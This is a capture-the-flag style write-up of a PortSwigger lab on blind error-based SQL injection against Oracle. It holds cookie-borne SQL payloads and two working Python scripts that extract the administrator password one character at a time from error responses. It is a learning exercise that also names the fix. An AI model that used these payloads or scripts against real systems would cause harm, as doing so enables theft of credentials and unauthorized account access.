# Visible error-based SQL injection

**Category:** Web Exploitation — SQL Injection  
**Difficulty:** Practitioner
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based`

 This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 
Hint:
This lab uses an Oracle database. 


---

## Reconnaissance

- What does the application do? 
    - Still the same basic shop website
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - there is no input field (account login is back) but the user can input text into the url
- What happens with normal input?
    - inputting a normal word instead of the given categories prints the word on the page and shows no results, inputting the given categories works like it should

---

## Analysis

#### Technology Stack
```
Database:   Oracle (as per the hint)
Input:      URL
Behavior:   Blind error-based SQL Injection
```

#### Vulnerability

- What exactly is vulnerable and why?
    
As per the lab instructions the cookie containing a `TrackingId` is vulnerable.
The sql in the background probably looks like this:
```sql
select TrackingId FROM TrackedUsers WHERE TrackingID = [Input]
```
This works like it should if there is just a TrackingId in the cookie, but if an Attacker puts sql in there this is unsafe.
This time the application has no 'Welcome back' message acting as a flag but instead returns an error message when the sql query causes an error.

---

## Solution

### Step 0 - Recreating the lesson

Inputting the same command as shown in the lesson (but slightly changed because of oracle syntax):
```sql
TrackingId=vOOG5hYxAdYPizP1'AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) = 'a'-- -
```
indeed throws a `HTTP/2 500 Internal Server Error` and when `1=2` it returns `HTTP/2 200 OK` so this is our boolean.

---
### Step 1 - Fingerprinting the database

Not subject of this lab, but can be done by trying different synax and see which reply crashes/stays alive. This is an oracle database as per the hint.
Usually done by using database specific syntax (`||` vs `+`, `v$version`).
---

### Step 2 - Enumeration

Step 1 is to get the length of the password again.
First take a look at the query given in the example:

```sql
TrackingId=KcwgrmMTdOVCuQnr' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
First lets just use LENGTH:

```sql
TrackingId=KcwgrmMTdOVCuQnr' AND (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20)
```

Double Parenthesis after `LENGTH` because `SELECT ...` is a subquery used as a value and thus needs to be inside brackets.
This will always give back a `http 200` since it does not trigger an error internally.
Wrapping this into the example query from the lab:

```sql
TrackingId=KcwgrmMTdOVCuQnr' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)='a'-- -
```

Note the `FROM DUAL` since ORACLE always needs `FROM` in every `SELECT`-Statement. This should produce a Response Error the moment the length of the admin password is equal to our comparing number. Simply changing the comparison number (BINARY SEARCH) gets the answer fairly quickly. In this case the admin password is 20 chars long when this error is sent.




### Step 3 - Extract / Exploit


Building the right sql injection code is a bit difficult since the query becomes quite long. 
I stopped using `FROM DUAL` and actually substituted it with the table used.
After several tries this is what I got:
```sql
TrackingId=KcwgrmMTdOVCuQnr' AND (SELECT CASE WHEN(username ='administrator' AND SUBSTR(password, 1, 1) = 'g') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')='a'-- -
```

A bit cleaner, since the inner `username ='administrator'` was redundant, because SQL is declarative not sequential:
```sql
TrackingId=KcwgrmMTdOVCuQnr' AND (SELECT CASE WHEN(SUBSTR(password, 1, 1) = 'g') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')='a'-- -;
```


```python
import requests, string

url = "https://0a15000a030c10eb8200f12900ea00af.web-security-academy.net/filter"
chars = string.ascii_lowercase + string.digits
password = ""

for pos in range(1, 21):
    for c in chars:
        payload = f"' AND (SELECT CASE WHEN(username='administrator' AND SUBSTR(password,{pos},1)='{c}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')='a'-- -"
        r = requests.get(url,
                         params={"category": "Gifts"},
                         cookies={"TrackingId": "KcwgrmMTdOVCuQnr" + payload,
                                  "session": "EhzDqLjfiBvf5DgfTNVIbJqta40DtFeh"})

        if r.status_code == 500:   # this time the check is not for 'Welcome' but for the http response
            password += c
            print(f"pos {pos}: {c} -> {password}")
            break

print("Password:", password)
```

And here a binary search variant that took a bit to get right:

```python
import requests, string

url = "https://0a90007703744002806808d000be0057.web-security-academy.net/filter"
chars = string.digits + string.ascii_lowercase
password = ""
for pos in range(1,21):
    low = 0
    high = len(chars)-1		
    while low < high:
        mid = (low + high) // 2
        payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pos},1)>'{chars[mid]}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"	
        r = requests.get(url,
                         params={"category": "Gifts"},
                         cookies={"TrackingId": "ZSMazFHnIclndAqI" + payload,
                                  "session":"lC9EwfO0bLmAXZnTilljPLOC0e95dOvA"})
        
        if r.status_code == 500:
                low = mid + 1
        else:
                high = mid
    password += chars[low]
    print(f"pos {pos}: {chars[low]} -> {password}")
print("Password:", password)

```

The password this time around is: f7fgtq8mrbpkztcmxo9g


---
## ADD-ON

```sql
TrackingId=KcwgrmMTdOVCuQnr' AND (SELECT CASE WHEN(SUBSTR(password, 1, 1) = 'g') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')='a'-- -;
```
This works but since the injection is into a string context the natural operator that belongs to strings is prefered (AND belongs to booleans). This operator is `||` (concatenation). `||` allows the query to be glued to the trackingID so it can be read as one thing by the database. `AND` works too but since it is a boolean operator it needs the useless `='a'-- -` at the end which is not needed with `||`. The `||` version looks like this:

```sql
TrackingId=KcwgrmMTdOVCuQnr'||(SELECT CASE WHEN SUBSTR(password,1,1)='g' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The way it works is the following:

sql goes through the input seeing the TrackingId string then `||` which tells it to concatenate that Id with the right operand next to `||`. So sql will interpret our input next. This `||` makes the whole thing a valid sql expression. Without it sql has no idea what it should do with two values right next to each other.
Lesson: After Escaping the `'...'` the next operator should fit the context (string -> ||, boolean -> AND) to make it a bit easier. 









## Real World Impact

The application leaked practically nothing and was still exploitable. This is dangerous because from a developers perspective this configuration looked secure. But even a tiny feedback like the HTTP Response here is enough to extract admin accounts. 
The only fix here is to prevent input from being read as code (parameterized queries). 
---

## Learnings

- Python scripting is easy and quick for these problems, binary search seems like a must.
- SQL is not sequential. SQL reads FROM -> WHERE -> SELECT. If kept in mind this makes building statements easier

